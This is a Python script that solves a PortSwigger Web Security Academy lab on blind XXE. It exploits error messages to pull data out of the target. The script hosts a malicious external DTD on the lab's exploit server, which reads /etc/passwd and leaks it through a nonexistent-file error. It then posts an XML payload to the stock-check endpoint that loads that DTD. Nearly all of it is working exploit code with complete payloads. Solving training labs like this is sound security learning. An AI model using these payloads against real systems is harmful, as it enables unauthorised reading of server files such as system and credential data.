import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
# author: 0xyf


class XXE6:
    def __init__(self):
        self.lab_id = "0a760088048a50d58446d53e00b000aa"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"
        self.get_exploit_srv_url()

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def store_dtd(self):
        payload = f"""<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;"""
        print(f"[+] payload 1: {payload}")
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": f"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def xxe(self):
        xxe_payload_1 = f"""<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "{self.exploit_srv_url}/exploit"> %xxe; ]>"""
        xxe_payload_2 = "%xxe;"
        data = f"""<?xml version="1.0" encoding="UTF-8"?>{xxe_payload_1}<stockCheck><productId>{xxe_payload_2}</productId><storeId>1</storeId></stockCheck>"""
        print(f"[+] payload2: {data}")
        r = requests.post(
            f"{self.vuln_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.store_dtd()
        self.xxe()
        self.check_solved()


def main():
    XXE6().solve()


if __name__ == "__main__":
    main()
